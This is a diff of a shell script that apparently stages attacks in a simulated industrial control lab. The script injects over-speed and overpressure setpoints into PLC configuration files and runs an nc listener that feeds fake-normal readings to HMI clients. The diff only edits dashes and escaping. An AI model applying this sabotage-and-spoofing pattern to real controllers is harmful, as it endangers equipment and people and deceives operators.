@@ -11,7 +11,7 @@ echo "Time:   $(date -u +%Y-%m-%dT%H:%M:%S)"
 
 case "$TARGET_ID" in
   plc-1)
-    echo "Compromising Centrifuge PLC (UF-320) — over-speed attack..."
+    echo "Compromising Centrifuge PLC (UF-320) - over-speed attack..."
 
     # Inject dangerous setpoints: RPM driven to structural failure limit
     cat > /plc/setpoints.conf << 'EOF'
@@ -30,7 +30,7 @@ EOF
     echo "Daemon will log RPM=1410 (over rated max) within 3 seconds."
 
     # Stop any existing spoof listener
-    pkill -f "nc -l.*9900\|nc -l -p 9900" 2>/dev/null || true
+    pkill -f "nc -l.*9900\\|nc -l -p 9900" 2>/dev/null || true
     sleep 1
 
     # HMI spoofing listener: serves fake-normal RPM to any connecting HMI client
@@ -49,7 +49,7 @@ EOF
     ;;
 
   plc-2)
-    echo "Compromising Valve PLC (VF-210) — overpressure attack..."
+    echo "Compromising Valve PLC (VF-210) - overpressure attack..."
 
     # Inject dangerous valve positions: fully open + 6x feed rate
     cat > /plc/setpoints.conf << 'EOF'
@@ -66,7 +66,7 @@ EOF
     echo ""
     echo "Daemon will log VALVE_A=97% VALVE_B=98% FEED_RATE=8.9kg/h within 3 seconds."
 
-    pkill -f "nc -l.*9900\|nc -l -p 9900" 2>/dev/null || true
+    pkill -f "nc -l.*9900\\|nc -l -p 9900" 2>/dev/null || true
     sleep 1
 
     (
